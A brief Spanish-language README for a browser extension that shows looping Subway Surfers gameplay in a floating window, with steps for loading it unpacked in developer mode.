# Subway Surfers Extension
Extensión que te abre una ventana flotante con un gameplay de Subway Surfers en bucle.

## Como usarlo
1. [Descargá la carpeta comprimida](https://github.com/user-attachments/files/31917426/ort-darkmode.zip) y extraé los archivos o cloná el repositorio.
2. Abrí la página de las extensiones de tu navegador y activá el modo desarrollador.
4. Tocá el botón **Cargar descomprimida** y seleccioná la carpeta de la extensión.
